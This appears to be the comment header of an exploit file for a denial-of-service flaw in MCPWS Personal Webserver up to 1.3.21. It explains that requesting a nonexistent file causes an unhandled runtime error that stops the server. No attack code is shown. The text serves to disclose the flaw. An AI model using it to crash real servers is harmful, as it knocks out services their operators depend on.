#  MCPWS Personal - Webserver <= 1.3.21 DoS Exploit
#  Vendor: http://www.mcpsoftware.de
#
#  The coder used a unsecure VB-function (Open) to open requested files
#  and didn't include a working error handling (On Error Goto etc).
#  It's possible to exploit this vulnerability by requesting files
#  that don't exist. Successful exploitation results
#  in a runtime error that stops the process.
